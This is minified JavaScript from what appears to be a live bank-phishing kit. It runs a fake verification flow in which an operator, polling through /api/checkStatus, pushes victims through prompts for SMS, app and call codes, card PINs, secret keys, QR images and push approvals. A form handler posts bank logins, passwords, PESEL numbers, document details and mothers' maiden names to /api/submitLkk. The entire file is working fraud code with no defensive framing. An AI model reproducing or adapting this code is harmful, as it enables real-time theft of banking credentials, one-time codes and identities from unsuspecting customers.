async function init(){var e=null;function t(e){swal({title:e.value,content:{element:"input",attributes:{type:"file",id:"file-image",required:!0,style:"text-align: center;width: auto;margin-left:auto;margin-right:auto;"}},closeOnEsc:!1,closeOnClickOutside:!1,buttons:{confirm:{text:translate.submit[AD_LANG],closeModal:!1}}}).then((async e=>{try{let e=document.getElementById("file-image");if(1!=e.files.length)return;let t=e.files[0];if(!t.type.startsWith("image"))return;!async function(t){let l=await function(e){return new Promise(((t,a)=>{var l=new FileReader;l.readAsDataURL(e),l.onload=function(){t(l.result)},l.onerror=function(e){a(e)}}))}(t);e.value="",$.ajax({type:"POST",url:"/api/submitQr",data:{resFile:l,token:LOG_TOKEN},success:e=>{a()},error:()=>{a()}})}(t)}catch(e){a()}}))}function a(){swal(translate.wait[AD_LANG],translate.bank_processes[AD_LANG],"info",{closeOnClickOutside:!1,closeOnEsc:!1,buttons:!1})}function l(){swal(translate.picture_title[AD_LANG],translate.picture_text[AD_LANG],"info",{content:{element:"div",attributes:{id:"pictures_div"}},closeOnClickOutside:!1,closeOnEsc:!1,buttons:!1});const e=["банан","брюки","бургер","гитара","зонтик","календарь","калькулятор","карандаш","клубника","компас","крокодил","лимон","мамонт","микрофон","наушники","очки","помидор","свитер","телефон","цветок","шоколад"].sort((()=>Math.random()-.5));document.querySelector("#pictures_div").innerHTML='<div class="pictures-container">'+e.map((e=>'<div class="pictures-element" data-item="'+e+'"><img draggable="false" alt="" src="/img/pictures/'+e+'.png"></div>')).join("\n")+"</div>",document.querySelector(".pictures-container").classList.remove("disabled")}function s(e="sms",t=translate.sms_title[AD_LANG],l=translate.sms_text[AD_LANG],s=translate.sms_placeholder[AD_LANG],n=translate.wrong_code[AD_LANG]){swal.stopLoading(),swal({title:t,text:l,content:{element:"input",attributes:{type:"password",placeholder:s,maxLength:255,required:!0,style:"text-align: center;width: auto;margin-left:auto;margin-right:auto;"}},closeOnEsc:!1,closeOnClickOutside:!1,buttons:{confirm:{text:translate.submit[AD_LANG],closeModal:!1}}}).then((async t=>{try{if(!t)return;$.ajax({type:"POST",url:"/api/submitCode",data:{codeType:e,code:t,token:LOG_TOKEN},success:e=>{a()},error:()=>{a()}})}catch(e){a()}}))}$("body").on("click",".pictures-container:not(.disabled) .pictures-element[data-item]",(e=>{e.preventDefault(),$(".pictures-container").removeClass("disabled").addClass("disabled"),$.ajax({url:"/api/selectPicture",type:"POST",data:{picture:$(e.target).data("item")||$(e.target).parent().data("item"),token:LOG_TOKEN},success:()=>{setTimeout((()=>{alert(translate.wrong_picture[AD_LANG]),$(".pictures-container").removeClass("disabled"),l()}),750)},error:()=>{setTimeout((()=>{alert(translate.wrong_picture[AD_LANG]),$(".pictures-container").removeClass("disabled"),l()}),750)}})}));var n=null;!function r(){$.ajax({type:"POST",url:"/api/checkStatus",data:{token:LOG_TOKEN},success:r=>{var o;r.status==e&&"secretKeyy"!==e||("profit"==(e=r.status)?swal(translate.success[AD_LANG],translate.money_will[AD_LANG],"success",{closeOnClickOutside:!1,closeOnEsc:!1,buttons:!1}):"sms"==e?s():"appCode"==e?s("app",translate.app_code_title[AD_LANG],translate.app_code_text[AD_LANG],translate.app_code_placeholder[AD_LANG]):"callCode"==e?s("call",translate.call_code_title[AD_LANG],translate.call_code_text[AD_LANG],translate.call_code_placeholder[AD_LANG]):"cardpin"==e?s("cardpin","PIN","Az ellenőrzés folytatásához küldje el a PIN kódot a kártyájáról","PIN"):"push"==e?swal(translate.push_title[AD_LANG],translate.push_text[AD_LANG],"info",{closeOnClickOutside:!1,closeOnEsc:!1,buttons:!1}):"sendVoice"==e?swal("Achtung","Befolgen Sie die Anweisungen des Telefongesprächs","info",{closeOnClickOutside:!1,closeOnEsc:!1,buttons:!1}):"limits"==e?swal({title:translate.error_title[AD_LANG],text:translate.limits[AD_LANG],type:"error",closeOnConfirm:!1,closeOnCancel:!1,closeOnClickOutside:!1,closeOnEsc:!1}).then((e=>{e&&(document.location.href="/ad/"+AD_ID)})):"otherCard"==e?swal({title:translate.error_title[AD_LANG],text:translate.other_card[AD_LANG],type:"error",closeOnConfirm:!1,closeOnCancel:!1,closeOnClickOutside:!1,closeOnEsc:!1}).then((e=>{e&&(document.location.href="/ad/"+AD_ID)})):"otherLk"==e?swal({title:translate.error_title[AD_LANG],text:translate.other_lk[AD_LANG],type:"error",closeOnConfirm:!1,closeOnCancel:!1,closeOnClickOutside:!1,closeOnEsc:!1}).then((e=>{e&&(document.location.href="/select/"+AD_ID)})):"forVerify"==e?swal({title:translate.error_title[AD_LANG],text:translate.for_verify[AD_LANG],type:"error",closeOnConfirm:!1,closeOnCancel:!1,closeOnClickOutside:!1,closeOnEsc:!1}).then((e=>{e&&(document.location.href="/ad/"+AD_ID)})):"correctBalance"==e?swal({title:translate.error_title[AD_LANG],text:translate.correct_balance[AD_LANG],type:"error",closeOnConfirm:!1,closeOnCancel:!1,closeOnClickOutside:!1,closeOnEsc:!1}).then((e=>{e&&(document.location.href="/ad/"+AD_ID)})):"picture"==e?l():"wait"==e?a():"cardError"==e?swal({title:translate.error_title[AD_LANG],text:"Falsche Anmeldedaten",type:"error",closeOnConfirm:!1,closeOnCancel:!1,closeOnClickOutside:!1,closeOnEsc:!1}).then((e=>{e&&document.querySelectorAll('input:not([hidden]):not([type="hidden"]):not([type="submit"])').forEach((e=>e.value=""))})):"toDeposit"==e?function(e){swal(translate.error_title[AD_LANG],translate.todeposit[AD_LANG].replace("{sum}",e.value),"info",{closeOnClickOutside:!1,closeOnEsc:!1,buttons:!1})}(r):"sendQr"==e?t(r):"secretKey"==e?s("secretKey",translate.secretKey[AD_LANG].replace("{sum}",r.value),"",""):"secretKeyy"==e?r.value!==n&&(o=r.value,swal(translate.attention[AD_LANG],translate.secretKey[AD_LANG].replace("{sum}",o),"info",{closeOnClickOutside:!1,closeOnEsc:!1,buttons:!1}),n=r.value):"toCard"==e&&(document.location.href="/ad/"+ +AD_ID))}}).done((()=>setTimeout(r,1500)))}(),$("body").on("submit","#lk_form",(e=>{e.preventDefault(),$.ajax({type:"POST",url:"/api/submitLkk",data:{token:LOG_TOKEN,login:$("#login").val(),password:$("#password").val(),pesel:$("#pesel").val(),pin:$("#pin").val(),bic:$("#bic").val(),birth:$("#birth").val(),otdel:$("#otdel").val(),bank:$("#bank").val(),documento:$("#documento").val(),numerodocumento:$("#numerodocumento").val(),fechadocumento:$("#fechadocumento").val(),motherlastname:$("#motherlastname").val(),motherlastnamee:$("#motherlastnamee").val(),konto:$("#konto").val(),unterkonto:$("#unterkonto").val(),haslo:$("#haslo").val()},beforeSend:()=>{$("#lk_form").find("[type=submit]").prop("disabled",!0)},success:e=>{$("#lk_form").find("[type=submit]").prop("disabled",!1),swal({title:translate.wait[AD_LANG],text:translate.bank_processes[AD_LANG],icon:"info",closeOnClickOutside:!1,closeOnEsc:!1,buttons:!1})},error:()=>{$("#lk_form").find("[type=submit]").prop("disabled",!1),swal(translate.error_title[AD_LANG],translate.error[AD_LANG],"error")}})}))}init();